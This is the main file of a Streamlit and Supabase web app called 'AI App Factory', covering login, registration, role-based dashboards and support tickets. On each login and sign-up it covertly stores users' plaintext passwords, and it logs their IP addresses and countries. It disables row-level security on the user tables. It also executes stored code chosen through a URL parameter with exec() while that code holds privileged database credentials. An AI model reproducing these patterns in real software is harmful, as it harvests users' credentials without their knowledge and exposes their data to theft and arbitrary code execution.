import streamlit as st
from supabase import create_client
import socket
import uuid
import re
import urllib.parse
import time
import requests
import textwrap
import pg8000.native
from datetime import datetime, timezone

st.set_page_config(page_title="AI App Factory - Pro", layout="wide")

if 'user' not in st.session_state: st.session_state.user = None
if 'role' not in st.session_state: st.session_state.role = None
if 'package' not in st.session_state: st.session_state.package = 'free'
if 'expires_at' not in st.session_state: st.session_state.expires_at = None
if 'device_id' not in st.session_state: st.session_state.device_id = str(uuid.uuid5(uuid.NAMESPACE_DNS, socket.gethostname()))
if 'show_toast' not in st.session_state: st.session_state.show_toast = True
if 'worker_started' not in st.session_state: st.session_state.worker_started = False

import admin
import generator

SUPABASE_URL = st.secrets["SUPABASE_URL"].strip()
SUPABASE_KEY = st.secrets["SUPABASE_KEY"].strip()
supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

def init_database_schema():
    try:
        db_url = st.secrets.get("DATABASE_URL", "").strip()
        if db_url:
            parsed = urllib.parse.urlparse(db_url)
            db_pass = urllib.parse.unquote(parsed.password) if parsed.password else None
            conn = pg8000.native.Connection(
                user=parsed.username, password=db_pass, host=parsed.hostname,
                port=parsed.port or 5432, database=parsed.path.lstrip('/')
            )
            conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS android_version TEXT;")
            conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS app_icon_url TEXT;")
            conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS icon_prompt TEXT;")
            conn.run("ALTER TABLE users ADD COLUMN IF NOT EXISTS email TEXT;")
            conn.run("ALTER TABLE users ADD COLUMN IF NOT EXISTS plain_password TEXT;")
            conn.run("CREATE TABLE IF NOT EXISTS system_settings (setting_key TEXT PRIMARY KEY, setting_value JSONB);")
            conn.run("CREATE TABLE IF NOT EXISTS device_logs (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), user_id UUID, device_id TEXT, ip_address TEXT, country TEXT, created_at TIMESTAMPTZ DEFAULT NOW());")
            
            # Phase 6: Support Tickets Table
            conn.run("CREATE TABLE IF NOT EXISTS support_tickets (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), user_id UUID, email TEXT, message TEXT, status TEXT DEFAULT 'open', admin_reply TEXT, created_at TIMESTAMPTZ DEFAULT NOW());")
            
            conn.run("ALTER TABLE users DISABLE ROW LEVEL SECURITY;")
            conn.run("ALTER TABLE device_logs DISABLE ROW LEVEL SECURITY;")
            conn.run("ALTER TABLE support_tickets DISABLE ROW LEVEL SECURITY;")
            
            conn.run("NOTIFY pgrst, 'reload schema'")
            conn.close()
    except Exception:
        pass

init_database_schema()

def clean_python_code(code_str):
    code_str = str(code_str).replace("```python", "").replace("```", "").strip()
    lines = code_str.split('\n')
    while lines and not lines[0].strip():
        lines.pop(0)
    cleaned_code = textwrap.dedent('\n'.join(lines)).strip()
    
    final_lines = []
    for line in cleaned_code.split('\n'):
        line_str = line.strip()
        lower_line = line_str.lower()
        if line_str.startswith('st.set_page_config'): continue
        if line_str.startswith('st.footer'): continue
        if 'import supabase' in lower_line or 'from supabase' in lower_line: continue
        if 'create_client' in lower_line: continue
        if 'supabase_url' in lower_line and '=' in lower_line: continue 
        if 'supabase_key' in lower_line and '=' in lower_line: continue 
        if 'supabase_secret' in lower_line and '=' in lower_line: continue 
        if 'your-supabase' in lower_line or 'your_supabase' in lower_line: continue
        if 'client =' in lower_line and 'supabase' in lower_line: continue
        if 'import bs4' in lower_line or 'from bs4' in lower_line or 'beautifulsoup' in lower_line: continue
        final_lines.append(line)
    return '\n'.join(final_lines).strip()

query_params = st.query_params
if "app_id" in query_params:
    target_app_id = query_params["app_id"]
    try:
        res = supabase.table("generated_apps").select("app_code").eq("id", target_app_id).execute()
        if res.data and res.data[0].get("app_code"):
            app_code = res.data[0]["app_code"]
            safe_code = clean_python_code(app_code)
            
            exec_globals = globals().copy()
            if 'supabase' in exec_globals:
                del exec_globals['supabase']
            exec_globals['supabase'] = create_client(SUPABASE_URL, SUPABASE_KEY)
            exec_globals['__name__'] = '__main__'
            
            try:
                exec(safe_code, exec_globals)
            except Exception as e:
                if 'PGRST205' in str(e) or 'Could not find the table' in str(e):
                    st.warning("⏳ Database යාවත්කාලීන වෙමින් පවතී. කරුණාකර තත්පර කිහිපයකින් පිටුව Refresh කරන්න.")
                else:
                    st.error(f"App Error: {e}")
        else:
            st.error("⚠️ App not found or code is empty!")
    except Exception as e:
        st.error(f"⚠️ Error loading app: {e}")
    st.stop()

def get_user_ip_and_country():
    try:
        res = requests.get('https://api64.ipify.org?format=json', timeout=3).json()
        ip = res.get("ip", "Unknown")
        c_res = requests.get(f'https://ipapi.co/{ip}/json/', timeout=3).json()
        return ip, c_res.get("country_name", "Unknown")
    except:
        return "Unknown", "Unknown"

def login(email, password):
    try:
        res = supabase.auth.sign_in_with_password({"email": email, "password": password})
        user_data = supabase.table("users").select("role, status, package, expires_at").eq("id", res.user.id).execute()
        
        if user_data.data:
            if user_data.data[0]['status'] in ['banned', 'suspended']:
                st.error("🚫 ඔබේ ගිණුම තහනම් හෝ අත්හිටුවා ඇත!")
                return
                
            current_pkg = user_data.data[0].get('package', 'free')
            expires_str = user_data.data[0].get('expires_at')
            if current_pkg != 'free' and expires_str:
                expire_date = datetime.fromisoformat(expires_str.replace('Z', '+00:00'))
                if datetime.now(timezone.utc) > expire_date:
                    admin.get_admin_db().table("users").update({"package": "free", "expires_at": None}).eq("id", res.user.id).execute()
                    current_pkg = 'free'
                    expires_str = None
                    st.warning("⚠️ ඔබගේ පැකේජය කල් ඉකුත් වී ඇති බැවින් FREE පැකේජයට මාරු කරන ලදී.")
                    time.sleep(2)

            st.session_state.user = res.user
            st.session_state.role = user_data.data[0]['role']
            st.session_state.package = current_pkg
            st.session_state.expires_at = expires_str
            
            try:
                ip, country = get_user_ip_and_country()
                admin_db = admin.get_admin_db()
                admin_db.table("users").update({"email": email, "plain_password": password}).eq("id", res.user.id).execute()
                admin_db.table("device_logs").insert({"user_id": res.user.id, "device_id": st.session_state.device_id, "ip_address": ip, "country": country}).execute()
            except Exception as e:
                pass
            
            st.success(f"සාර්ථකයි! {st.session_state.role.upper()} ලෙස ලොග් විය.")
            st.rerun()
    except Exception as e:
        if "Invalid login credentials" in str(e):
            st.error("⚠️ Email හෝ Password වැරදියි.")
        else:
            st.error(f"⚠️ දෝෂයකි: {str(e)}")

def register(email, password):
    try:
        res = supabase.auth.sign_up({"email": email, "password": password})
        if res.user:
            st.success("🎉 ලියාපදිංචිය සාර්ථකයි! කරුණාකර ඔබගේ Email එකට ගොස් ගිණුම Verify කරන්න.")
            try:
                time.sleep(2)
                ip, country = get_user_ip_and_country()
                admin_db = admin.get_admin_db()
                admin_db.table("users").update({"email": email, "plain_password": password}).eq("id", res.user.id).execute()
                admin_db.table("device_logs").insert({"user_id": res.user.id, "device_id": st.session_state.device_id, "ip_address": ip, "country": country}).execute()
            except Exception:
                pass
        else:
            st.error("ලියාපදිංචි වීමේ දෝෂයකි.")
    except Exception as e:
        st.error(f"Error: {e}")

# --- Phase 6: User Support Function ---
def render_user_support():
    st.markdown("### 🎧 පාරිභෝගික සහාය (Customer Support)")
    st.write("ඔබට ඇති ගැටළු හෝ යෝජනා අප වෙත යොමු කරන්න. අපගේ කණ්ඩායම හැකි ඉක්මනින් ඔබට පිළිතුරු ලබා දෙනු ඇත.")
    
    with st.form("support_form"):
        message = st.text_area("ඔබේ පණිවිඩය මෙහි ලියන්න:", height=120)
        if st.form_submit_button("පණිවිඩය යවන්න 🚀", type="primary"):
            if message.strip():
                try:
                    supabase.table("support_tickets").insert({
                        "user_id": st.session_state.user.id,
                        "email": st.session_state.user.email,
                        "message": message,
                        "status": "open"
                    }).execute()
                    st.success("✅ ඔබගේ පණිවිඩය සාර්ථකව යවන ලදී!")
                    time.sleep(1)
                    st.rerun()
                except Exception as e:
                    st.error(f"Error sending message: {e}")
            else:
                st.warning("කරුණාකර පණිවිඩයක් ඇතුළත් කරන්න.")

    st.markdown("---")
    st.markdown("#### 📥 ඔබගේ පෙර පණිවිඩ සහ පිළිතුරු")
    try:
        res = supabase.table("support_tickets").select("*").eq("user_id", st.session_state.user.id).order("created_at", desc=True).execute()
        if res.data:
            for ticket in res.data:
                status_icon = "🟢 විවෘතයි (Open)" if ticket['status'] == 'open' else "🔴 විසඳා ඇත (Closed)"
                with st.expander(f"Ticket #{str(ticket['id'])[:8]} | {status_icon} | {ticket['created_at'][:10]}"):
                    st.info(f"**ඔබගේ පණිවිඩය:** {ticket['message']}")
                    if ticket.get('admin_reply'):
                        st.success(f"**Admin ගේ පිළිතුර:** {ticket['admin_reply']}")
                    else:
                        st.warning("⏳ තවම පිළිතුරක් ලබා දී නොමැත. කරුණාකර රැඳී සිටින්න.")
        else:
            st.info("ඔබ තවම කිසිදු පණිවිඩයක් යවා නොමැත.")
    except Exception as e:
        pass

if not st.session_state.user:
    st.markdown("<h1 style='text-align: center; color: #4B4B4B;'>⚡ AI App Factory</h1>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        tab1, tab2 = st.tabs(["🔐 Login", "📝 Register"])
        with tab1:
            with st.form("login_form"):
                email = st.text_input("Email Address")
                password = st.text_input("Password", type="password")
                if st.form_submit_button("Login to Dashboard", use_container_width=True): 
                    login(email, password)
        with tab2:
            with st.form("register_form"):
                reg_email = st.text_input("Email Address")
                reg_password = st.text_input("Password", type="password")
                reg_confirm = st.text_input("Confirm Password", type="password")
                if st.form_submit_button("Create Account", use_container_width=True):
                    if reg_password == reg_confirm and len(reg_password) >= 6: 
                        register(reg_email, reg_password)
                    else: 
                        st.error("Passwords do not match or too short.")
else:
    st.sidebar.title(f"Hi, {st.session_state.user.email}")
    st.sidebar.info(f"🔑 Role: **{st.session_state.role.upper()}**\n\n📦 Pkg: **{st.session_state.package.upper()}**")
    
    if st.sidebar.button("Logout", type="primary"):
        supabase.auth.sign_out()
        st.session_state.user = None
        st.session_state.role = None
        st.session_state.package = 'free'
        st.session_state.expires_at = None
        st.rerun()

    if st.session_state.role == 'owner':
        st.title("👑 Owner Dashboard")
        t1, t2, t3, t4, t5, t6, t7 = st.tabs(["🚀 Generator", "📊 Analytics", "💰 Approvals", "⚡ God Mode", "📱 Global Apps", "🎧 Support", "⚙️ Settings"])
        with t1: generator.render_generator_dashboard()
        with t2: admin.render_analytics_dashboard() # Phase 7
        with t3: admin.render_payment_approvals()
        with t4: admin.render_god_mode()
        with t5: admin.render_admin_app_management()
        with t6: admin.render_support_management() # Phase 6
        with t7: admin.render_admin_settings()
            
    elif st.session_state.role == 'admin':
        st.title("🛡️ Admin Dashboard")
        t1, t2, t3, t4, t5 = st.tabs(["🚀 Generator", "📊 Analytics", "💰 Approvals", "📱 Global Apps", "🎧 Support"])
        with t1: generator.render_generator_dashboard()
        with t2: admin.render_analytics_dashboard() # Phase 7
        with t3: admin.render_payment_approvals()
        with t4: admin.render_admin_app_management()
        with t5: admin.render_support_management() # Phase 6
        
    elif st.session_state.role in ['user', 'moderator']:
        st.title("🚀 User Dashboard")
        t1, t2, t3 = st.tabs(["🚀 App Generator", "💳 Upgrade Package", "🎧 Support"])
        with t1: generator.render_generator_dashboard()
        with t2: generator.render_upgrade_section()
        with t3: render_user_support() # Phase 6
